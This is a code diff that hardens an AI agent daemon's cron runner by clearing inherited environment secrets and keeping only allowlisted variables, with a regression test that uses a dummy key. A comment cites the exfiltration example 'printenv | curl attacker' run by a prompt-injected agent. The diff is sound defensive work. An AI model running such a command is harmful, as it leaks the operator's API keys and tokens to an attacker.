@@ -636,6 +636,29 @@ async fn run_job_command_with_timeout(
         .stderr(Stdio::piped())
         .kill_on_drop(true);
 
+    // CWE-200: cron jobs run UNATTENDED, so the secret-leak hardening matters
+    // even more here than for interactive `shell`. Clear the inherited daemon
+    // environment (which holds provider API keys / OAuth tokens) and re-add
+    // only the allowlisted variables — same invariant + same allowlist
+    // (`SAFE_ENV_VARS` + configured passthrough) ShellTool enforces. Without
+    // this, any allowlisted cron command (or a prompt-injected agent that
+    // schedules `printenv | curl attacker`) could exfiltrate secrets. The
+    // `sh -l` login shell re-sources profile files, so PATH/tooling still
+    // resolve. (cron sources from the daemon's process env rather than
+    // ShellTool's login-env enrichment — the daemon env is the correct source
+    // for an unattended job.)
+    cmd.env_clear();
+    for var in crate::tools::shell::collect_allowed_shell_env_vars(security) {
+        if let Ok(value) = std::env::var(&var) {
+            cmd.env(&var, value);
+        }
+    }
+    #[cfg(target_os = "windows")]
+    {
+        cmd.env("PYTHONUTF8", "1");
+        cmd.env("PYTHONIOENCODING", "utf-8");
+    }
+
     // CRIT-2 fix (workflow `w4cs72fjo`): cron's `sh -lc` spawn
     // previously bypassed Sandbox::wrap_command entirely, despite
     // SecurityPolicy already gating allowed commands above. An
@@ -847,6 +870,38 @@ mod tests {
         assert!(
             output.contains("job timed out after 1"),
             "expected per-job 1s timeout, got: {output}"
+        );
+    }
+
+    #[tokio::test]
+    async fn run_job_command_does_not_leak_secrets() {
+        // CWE-200 regression (mirrors tools::shell::shell_does_not_leak_api_key):
+        // a secret in the daemon process env must NOT reach the spawned cron
+        // shell, because env_clear() + the SAFE_ENV_VARS allowlist strip it.
+        let _env = env_lock().await;
+        let key = "PLAW_CRON_LEAK_TEST_SECRET";
+        std::env::set_var(key, "sk-supersecret-cron-must-not-leak");
+
+        let tmp = TempDir::new().unwrap();
+        let mut config = test_config(&tmp).await;
+        config.autonomy.allowed_commands = vec!["env".into()];
+        let job = test_job("env");
+        let security = SecurityPolicy::from_config(&config.autonomy, &config.workspace_dir);
+        let (success, output) = run_job_command(&config, &security, &job).await;
+
+        // Restore the env BEFORE any assert can panic and strand the var.
+        std::env::remove_var(key);
+
+        assert!(success, "env command should run: {output}");
+        assert!(
+            !output.contains("sk-supersecret-cron-must-not-leak"),
+            "secret leaked into cron shell env: {output}"
+        );
+        // Sanity: an allowlisted var still passes through, proving the child
+        // env is curated (not simply emptied).
+        assert!(
+            output.contains("PATH="),
+            "allowlisted PATH should still pass through: {output}"
         );
     }
 
